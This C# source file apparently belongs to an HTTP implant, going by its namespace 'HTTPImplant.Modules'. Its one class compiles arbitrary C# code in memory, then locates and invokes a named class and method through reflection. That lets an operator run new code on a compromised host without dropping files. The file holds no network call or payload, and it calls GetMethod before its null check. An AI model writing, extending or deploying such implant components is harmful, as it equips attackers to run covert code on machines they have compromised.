using System;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace HTTPImplant.Modules
{
    public static class CompileAndRunNET
    {
        public static void ExecuteCS(string code, string Class, string method)
        {
            Console.WriteLine("Compiling CS...");

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateInMemory = true,
                GenerateExecutable = false
            };

            CancellationTokenSource cts = new CancellationTokenSource();
            CancellationToken token = cts.Token;

            Task<CompilerResults> compilationTask = null;
            try
            {
                compilationTask = Task.Run(() =>
                {
                    using (CSharpCodeProvider provider = new CSharpCodeProvider())
                    {
                        return provider.CompileAssemblyFromSource(parameters, code);
                    }
                }, token);

                Console.WriteLine("1");

                if (!compilationTask.Wait(TimeSpan.FromSeconds(30))) // Increase if needed
                {
                    Console.WriteLine("Compilation timed out.");
                    cts.Cancel();
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception during compilation: " + ex.Message);
                return;
            }

            Console.WriteLine("2");

            try
            {
                CompilerResults results = compilationTask.Result;

                if (results.Errors.HasErrors)
                {
                    Console.WriteLine("Compilation failed:");
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine(error.ErrorText);
                    }
                }
                else
                {
                    Console.WriteLine("Compilation successful");

                    Assembly assembly = results.CompiledAssembly;
                    Type program = assembly.GetType(Class);
                    MethodInfo main = program.GetMethod(method);

                    if (program == null || main == null)
                    {
                        Console.WriteLine("Class or method not found in the compiled assembly.");
                        return;
                    }

                    Console.WriteLine("Executing: " + Class + "." + method);
                    main.Invoke(null, null); // Assuming the Main method doesn't need any arguments
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Execution exception: " + ex.Message);
            }
        }
    }
}
